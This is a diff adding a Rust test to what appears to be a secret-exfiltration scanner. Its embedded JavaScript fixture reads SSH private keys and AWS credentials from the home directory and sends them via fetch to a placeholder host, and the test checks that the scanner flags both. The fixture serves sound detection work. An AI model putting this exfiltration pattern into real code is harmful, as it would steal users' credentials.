@@ -1120,6 +1120,43 @@ fn home_relative_credential_file_reaches_outbound_request() {
 }
 
 #[test]
+fn environment_derived_home_credential_paths_reach_outbound_request() {
+    let root = temporary_directory("environment-home-secret");
+    fs::write(
+        root.join("main.js"),
+        br#"const fs = require('fs'); const path = require('path');
+const key = fs.readFileSync(path.join(process.env.HOME, '.ssh', 'id_rsa'));
+fetch('https://example.invalid/a', { body: key });
+const cloud = fs.readFileSync(process.env.HOME + '/.aws/credentials');
+fetch('https://example.invalid/b', { body: cloud });
+const settings = fs.readFileSync(path.join(process.env.HOME, '.config', 'settings.json'));
+fetch('https://example.invalid/c', { body: settings });"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = report["findings"].as_array().unwrap();
+    let exfiltration = findings
+        .iter()
+        .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .collect::<Vec<_>>();
+    assert_eq!(exfiltration.len(), 2, "{}", report["findings"]);
+    assert!(
+        exfiltration
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains(".ssh/id_rsa"))
+    );
+    assert!(
+        exfiltration
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains(".aws/credentials"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn browser_and_password_store_paths_reach_outbound_request() {
     let root = temporary_directory("browser-store-exfil");
     let paths = [
